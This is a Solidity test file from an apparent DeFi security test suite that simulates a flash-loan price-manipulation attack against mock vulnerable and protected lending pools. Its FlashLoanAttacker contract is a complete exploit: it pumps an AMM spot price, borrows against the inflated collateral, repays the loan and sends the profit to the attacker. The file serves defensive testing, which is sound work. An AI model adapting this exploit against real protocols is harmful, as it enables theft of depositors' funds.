// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SentinelBase.t.sol";
import "../targets/mocks/MockERC20.sol";
import "../targets/SimpleAMM.sol";
import "../targets/FlashLender.sol";
import "../targets/LendingVulnerable.sol";
import "../targets/LendingProtected.sol";

/// @notice Exploit contract combining uncollateralized flash loan, AMM manipulation, and lending borrow
contract FlashLoanAttacker is IFlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    MockERC20 public immutable collateralToken;
    MockERC20 public immutable borrowToken;
    SimpleAMM public immutable amm;
    FlashLender public immutable flashLender;
    address public immutable owner;

    constructor(
        address _collateralToken,
        address _borrowToken,
        address _amm,
        address _flashLender
    ) {
        collateralToken = MockERC20(_collateralToken);
        borrowToken = MockERC20(_borrowToken);
        amm = SimpleAMM(_amm);
        flashLender = FlashLender(_flashLender);
        owner = msg.sender;
    }

    function executeAttack(address lendingPool, uint256 loanAmount) external {
        bytes memory data = abi.encode(lendingPool);
        flashLender.flashLoan(this, address(borrowToken), loanAmount, data);
    }

    function onFlashLoan(
        address,
        address /* token */,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(flashLender), "Unauthorized flash lender");
        address lendingPool = abi.decode(data, (address));

        // Approvals
        borrowToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(address(amm), type(uint256).max);
        collateralToken.approve(lendingPool, type(uint256).max);

        // Step 1: Use 300 BOR from flash loan to pump COL spot price on AMM
        uint256 colBought = amm.swap(address(borrowToken), 300 ether);

        // Step 2: Deposit 20 COL as collateral into Lending
        (bool depOk, ) = lendingPool.call(
            abi.encodeWithSignature("depositCollateral(uint256)", 20 ether)
        );
        require(depOk, "Deposit collateral failed");

        // Step 3: Borrow 180 BOR against inflated collateral
        (bool borrowOk, bytes memory errData) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", 180 ether)
        );
        if (!borrowOk) {
            assembly {
                revert(add(errData, 32), mload(errData))
            }
        }

        // Step 4: Swap remaining COL back on AMM to recover BOR
        if (colBought > 20 ether) {
            amm.swap(address(collateralToken), colBought - 20 ether);
        }

        // Step 5: Repay flash loan principal + fee
        uint256 repayment = amount + fee;
        require(borrowToken.balanceOf(address(this)) >= repayment, "Cannot repay flash loan");
        borrowToken.transfer(address(flashLender), repayment);

        // Step 6: Send surplus profit to attacker owner
        uint256 profit = borrowToken.balanceOf(address(this));
        if (profit > 0) {
            borrowToken.transfer(owner, profit);
        }

        return CALLBACK_SUCCESS;
    }
}
contract NonRepayingBorrower is IFlashBorrower {
    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure override returns (bytes32) {
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

/// @title Flash Loan Attack Simulation
/// @notice Simulates an uncollateralized flash loan used to manipulate AMM spot prices and drain lending.
contract FlashLoanTest is SentinelBase {
    MockERC20 public collateralToken;
    MockERC20 public borrowToken;
    SimpleAMM public amm;
    FlashLender public flashLender;

    function setUp() public {
        collateralToken = new MockERC20("Collateral Token", "COL", 18);
        borrowToken = new MockERC20("Borrow Token", "BOR", 18);

        amm = new SimpleAMM(address(collateralToken), address(borrowToken));
        flashLender = new FlashLender();

        // Honest LP funds AMM: 100 COL & 100 BOR (Initial price: 1 COL = 1 BOR)
        collateralToken.mint(honestUser, 100 ether);
        borrowToken.mint(honestUser, 100 ether);
        vm.startPrank(honestUser);
        collateralToken.approve(address(amm), 100 ether);
        borrowToken.approve(address(amm), 100 ether);
        amm.addLiquidity(100 ether, 100 ether);
        vm.stopPrank();

        // Establish the initial TWAP after a full observation window.
        vm.warp(block.timestamp + 30 minutes);
        amm.updateTWAP();

        // Honest LP funds FlashLender with 1000 BOR
        borrowToken.mint(address(flashLender), 1000 ether);
    }

    function test_flashLoanRejectsMissingRepayment() public {
        NonRepayingBorrower borrower = new NonRepayingBorrower();

        uint256 lenderBalanceBefore = borrowToken.balanceOf(address(flashLender));

        vm.expectRevert("FlashLender: flash loan not repaid with fee");

        flashLender.flashLoan(
            borrower,
            address(borrowToken),
            100 ether,
            ""
        );

        assertEq(
            borrowToken.balanceOf(address(flashLender)),
            lenderBalanceBefore,
            "Failed flash loan must restore lender balance"
        );
    }

    function test_protectedFlashLoanPreservesLendingLiquidity() public {
    LendingProtected lending = new LendingProtected(
        address(collateralToken),
        address(borrowToken),
        address(amm)
    );

    borrowToken.mint(honestUser, 250 ether);

    vm.startPrank(honestUser);
    borrowToken.approve(address(lending), 250 ether);
    lending.supplyBorrowLiquidity(250 ether);
    vm.stopPrank();

    uint256 poolBefore = borrowToken.balanceOf(address(lending));
    uint256 lenderBefore = borrowToken.balanceOf(address(flashLender));

    vm.startPrank(attacker);
    FlashLoanAttacker attackContract = new FlashLoanAttacker(
        address(collateralToken),
        address(borrowToken),
        address(amm),
        address(flashLender)
    );

    vm.expectRevert();
    attackContract.executeAttack(address(lending), 500 ether);
    vm.stopPrank();

    assertEq(
        borrowToken.balanceOf(address(lending)),
        poolBefore,
        "Protected lending liquidity must remain unchanged"
    );

    assertEq(
        borrowToken.balanceOf(address(flashLender)),
        lenderBefore,
        "Failed flash loan must restore lender balance"
    );
}

    function test_flash_loan() public {
        string memory variant = getVariant();
        bool isProtected = keccak256(bytes(variant)) == keccak256(bytes("protected"));

        address lendingPool;
        if (isProtected) {
            LendingProtected protectedLending = new LendingProtected(
                address(collateralToken),
                address(borrowToken),
                address(amm)
            );
            lendingPool = address(protectedLending);
        } else {
            LendingVulnerable vulnLending = new LendingVulnerable(
                address(collateralToken),
                address(borrowToken),
                address(amm)
            );
            lendingPool = address(vulnLending);
        }

        // Honest LPs fund LendingPool with 250 BOR liquidity
        borrowToken.mint(honestUser, 250 ether);
        vm.startPrank(honestUser);
        borrowToken.approve(lendingPool, 250 ether);
        (bool supplyOk, ) = lendingPool.call(
            abi.encodeWithSignature("supplyBorrowLiquidity(uint256)", 250 ether)
        );
        require(supplyOk, "Lending liquidity supply failed");
        vm.stopPrank();

        // Attacker starts with 0 BOR capital!
        uint256 attackerBorBefore = borrowToken.balanceOf(attacker);
        assertEq(attackerBorBefore, 0);

        vm.startPrank(attacker);
        FlashLoanAttacker attackContract = new FlashLoanAttacker(
            address(collateralToken),
            address(borrowToken),
            address(amm),
            address(flashLender)
        );

        bool attackSucceeded = false;
        string memory note;

        // Attacker borrows 500 BOR via flash loan
        try attackContract.executeAttack(lendingPool, 500 ether) {
            uint256 attackerBorAfter = borrowToken.balanceOf(attacker);
            if (attackerBorAfter > attackerBorBefore) {
                attackSucceeded = true;
                note = "drained lending pool via flash loan AMM pump and repaid lender";
            } else {
                note = "flash loan executed but no profit extracted";
            }
        } catch Error(string memory reason) {
            note = string.concat("flash loan exploit blocked: ", reason);
        } catch (bytes memory) {
            note = "flash loan exploit blocked by protocol guard";
        }
        vm.stopPrank();

        uint256 netProfit = 0;
        if (borrowToken.balanceOf(attacker) > attackerBorBefore) {
            netProfit = borrowToken.balanceOf(attacker) - attackerBorBefore;
        }

        emitSentinelResult("flash_loan", variant, attackSucceeded, netProfit, note);
    }
}
